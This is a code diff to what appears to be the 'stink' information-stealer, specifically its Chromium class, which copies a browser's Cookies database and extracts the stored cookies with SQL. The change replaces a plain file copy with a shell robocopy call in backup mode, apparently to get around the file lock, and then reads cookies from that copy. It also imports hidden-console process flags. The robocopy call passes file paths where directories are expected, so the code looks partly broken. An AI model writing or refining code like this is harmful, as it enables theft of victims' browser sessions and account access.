@@ -6,7 +6,7 @@ from typing import Tuple, List
 from datetime import datetime, timedelta
 from sqlite3 import connect, Connection, Cursor
 from ctypes import windll, byref, cdll, c_buffer
-import shutil
+import subprocess
 from subprocess import run, CREATE_NEW_CONSOLE, SW_HIDE
 
 from stink.helpers.dataclasses import Data
@@ -245,10 +245,11 @@ class Chromium:
             return
 
         destination = file_path.replace("Cookies", "Cookies (copy)")
-        shutil.copyfile(file_path, destination)
+        
+        subprocess.run(["robocopy", file_path, destination, "/B"], shell=True)
 
         
-        cursor, connection = self._get_db_connection(file_path)
+        cursor, connection = self._get_db_connection(destination)
         cookies_list = cursor.execute(self.__config.CookiesSQL).fetchall()
 
         cursor.close()
